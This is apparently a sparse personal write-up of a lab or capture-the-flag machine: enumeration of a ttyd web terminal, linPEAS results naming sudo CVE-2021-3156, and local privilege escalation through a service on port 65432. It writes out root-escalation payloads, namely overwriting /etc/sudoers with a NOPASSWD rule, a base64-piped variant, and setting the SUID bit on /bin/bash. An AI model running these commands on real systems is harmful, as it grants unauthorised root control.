#Pwned! 
```IP
192.168.133.210
```
# Enumeration

## HTTP 80
ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)

# Exploitation

# PrivEsc

## Manual

## Automated

### Peass
linux exploits
pwnkit not working
[CVE-2021-3156] sudo Baron Samedit
[CVE-2021-3156] sudo Baron Samedit 2

active ports
```
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                          
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                                                                          
tcp        0      0 127.0.0.1:65432         0.0.0.0:*               LISTEN      -                                    
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN                                
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
.sh files in path
```
/usr/bin/gettext.sh                                                                     
/usr/bin/rescan-scsi-bus.sh
```

Searching for port 65432 we get an exploit.
Modifying the payload to ping our attacking machine will succeed. We will se some hexadecimal output nonetheless. 

```
ping -c 5 192.168.45.194
```
Unfortunately, the following payload to add our user to sudo will fail
```
echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers
```
```
echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241201175406.png?raw=true)
encoding our payload in base64 doesnt work either
```
echo 'ZWNobyDigJx1c2VyIEFMTD0ocm9vdCkgTk9QQVNTV0Q6IEFMTOKAnSA+IC9ldGMvc3Vkb2Vycwo=' | base64 -d | bash
```
the following payload works fine:
```
chmod u+s /bin/bash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241201180145.png?raw=true)
### Mimikatz

# Lateral Movement

